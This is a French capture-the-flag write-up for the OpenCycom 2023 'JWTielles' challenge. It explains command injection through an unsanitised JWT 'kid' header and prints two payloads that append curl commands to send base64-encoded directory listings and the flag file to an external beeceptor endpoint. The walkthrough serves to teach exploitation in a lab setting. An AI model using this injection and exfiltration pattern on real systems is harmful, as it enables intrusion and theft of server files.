---
title: "JWTielles"
date: 2023-06-13T09:03:20-08:00
draft: false
---


# OpenCycom 2023 - JWTielles - *300 pts*

## Enoncé
```mmmmmmmmmmm les bonnes tielles...... 🤤```


## Solution
Le challenge commence sur un super site de tielles `miam`.

![](/images/004/01.jpg)

On remarque en haut à droite une fonction API qui nous redirige vers un endpoint `GET /api/tielles`, qui nous renvoie une image aléatoire de tielle.

Si l'on observe les requêtes qui passent avec un proxy (type Burp Suite), on peut remarquer que l'API nous attribue un jeton d'authentification lors de la première visite de la page.

![](/images/004/02.png)


Lorsque l'on décode le JWT, on se rend compte qu'il ne contient que très peu d'informations. Le seul header un peu inhabituel est le header "kid", qui contient un GUID qui semble ne pas changer entre plusieurs tokens.

![](/images/004/03.png)

Si l'on ne connaît pas le fonctionnement du paramètre KID dans un JWT, une petite recherche Google nous permet de retrouver la RFC ou d'autres ressources qui nous expliquent que le KID était un paramètre qui sert à indiquer au serveur quelle clé utilisée pour signer le token en question.

Cependant, selon la RFC, il n'y a pas de méthode d'implémentation préconisée. Il est donc possible que le challenge repose sur une mauvaise implémentation de ce paramètre.

![](/images/004/04.png)

Selon la méthode de stockage du KID (en BDD, sur le FS, à l'extérieur...) les attaques possibles sont assez larges.

Ici, le développeur de JWTielles a (malheureusement) choisi de stocker le token sur le filesystem, et de retrouver le contenu du fichier à l'aide d'une commande système `cat`. Cette commande est exécutée forcément *avant* la vérification de la signature, ce qui nous permet de mettre les données de notre choix dans le KID sans problème de vérification.

Nous pouvons exploiter un manque de sanitisation des entrées utilisateurs qui sont passées directement dans la commande système.

Concrètement, le paramètre "kid" est vulnérable à une injection de commande. Pour l'exploiter, il suffit d'utiliser un caractère pour terminer la commande en cours (";","&&", ou "||" par exemple), et d'insérer la commande de notre choix.

Cette exécution de commande se fait à l'aveugle, car une fois la commande exécutée, le résultat est passé comme clé pour la signature du JWT. Nous devons donc trouver un moyen d'exfiltrer le résultat de nos commandes.

On peut passer directement par HTTP, en utilisant des services comme RequestBin ou Beeceptor, qui nous permettent d'obtenir le contenu des requêtes qui leur sont envoyées.

```{"alg": "HS256", "typ": "JWT", "kid": "dummy; curl -X \"POST\" -d $(ls -a|base64 -w 0) https://example.free.beeceptor.com"}```

![](/images/004/05.png)

On reçoit : 

![](/images/004/06.png)

Donc on affiche le flag :

```{"alg": "HS256", "typ": "JWT", "kid": "dummy; curl -X \"POST\" -d $(cat ./flag|base64 -w 0) https://example.free.beeceptor.com"}```

![](/images/004/07.png)


Et voila !

*FLAG : OPC{N3\*\*\*\*\*\*\*\*\*\*\*\*\*\*1D}*
